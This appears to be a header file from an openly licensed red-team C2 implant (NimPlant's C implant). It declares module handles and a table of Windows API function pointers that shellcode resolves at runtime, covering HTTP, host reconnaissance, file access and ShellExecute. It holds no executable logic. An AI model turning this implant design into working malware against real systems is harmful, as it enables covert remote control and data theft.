/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * A struct of module definitions that are loaded and used by the shellcode.
 */
struct ModuleTable {
    HMODULE hKernel32;
    HMODULE hMsvcrt;
    HMODULE hUcrtBase;
    HMODULE hWinHttp;
    HMODULE hIpHlpApi;
    HMODULE hWs2_32;
    HMODULE hAdvapi32;
    HMODULE hNtdll;
    HMODULE hShlwapi;
    HMODULE hShell32;
};

/**
 * A struct of function definitions that are loaded and used by the shellcode.
 */
struct FunctionTable {
    // Must always be present (these are initialized by Relocatable)
    // https://github.com/tijme/relocatable
    HMODULE (*LoadLibraryA)(LPCSTR lpLibFileName);
    FARPROC (*GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);

    // Custom functions used by this shellcode
    int (*rand)(void);
    void (*srand)(unsigned int);
    time_t (*time)(time_t*);
    size_t (*wcslen)(const wchar_t*);
    wchar_t* (*wcscat_s)(wchar_t*, size_t, const wchar_t*);
    wchar_t* (*wcscpy)(wchar_t*, const wchar_t*);
    size_t (*strlen)(const char*);
    char* (*strcpy)(char*, const char*);
    char* (*strcat)(char*, const char*);
    int (*strcmp) (const char* str1, const char* str2);
    char* (*strchr)(const char*, int);
    char* (*strrchr)(const char*, int);
    void* (*malloc)(size_t);
    void* (*calloc)(size_t, size_t);
    void (*memset)(void*, int, size_t);
    void* (*realloc)(void*, size_t);
    void* (*memcpy)(void*, void*, size_t);
    void (*free)(void*);
    int (*MultiByteToWideChar)(UINT, DWORD, LPCCH, int, LPWSTR, int);
    int (*snprintf)(char*, size_t, const char*, ...);
    int (*sprintf)(char*, const char*, ...);
    HINTERNET (*WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    HINTERNET (*WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    HINTERNET (*WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD);
    HINTERNET (*WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    HINTERNET (*WinHttpReceiveResponse)(HINTERNET, LPVOID);
    HINTERNET (*WinHttpCloseHandle)();
    BOOL (*WinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
    BOOL (*WinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
    BOOL (*WinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
    ULONG (*GetAdaptersAddresses)(ULONG, ULONG, PVOID, PIP_ADAPTER_ADDRESSES, PULONG);
    PCSTR (*inet_ntop)(INT, const VOID*, PSTR, size_t);
    BOOL (*GetUserNameA)(LPSTR, LPDWORD);
    BOOL (*GetComputerNameA)(LPSTR, LPDWORD);
    DWORD (*GetCurrentProcessId)(void);
    DWORD (*GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    void (*Sleep)(DWORD);
    NTSTATUS (*RtlGetVersion)(PRTL_OSVERSIONINFOW);
    FILE* (*fopen)(const char*, const char*);
    int (*fseek)(FILE*, long, int);
    long (*ftell)(FILE*);
    int (*fclose)(FILE*);
    size_t (*fread)(void*, size_t, size_t, FILE*);
    int (*chdir)(const char *);
    HANDLE (*CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    BOOL (*CloseHandle)(HANDLE);
    BOOL (*ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    BOOL (*WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    DWORD (*GetFileSize)(HANDLE, LPDWORD);
    DWORD (*GetCurrentDirectoryA)(DWORD, LPSTR);
    HANDLE (*FindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
    BOOL (*FindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
    BOOL (*FindClose)(HANDLE);
    DWORD (*GetFileAttributesA)(LPCSTR);
    BOOL (*PathFileExistsA)(LPCSTR);
    DWORD (*GetFullPathNameA)(LPCSTR, DWORD, LPSTR, LPSTR);
    BOOL (*MoveFileA)(LPCSTR, LPCSTR);
    HINSTANCE (*ShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
};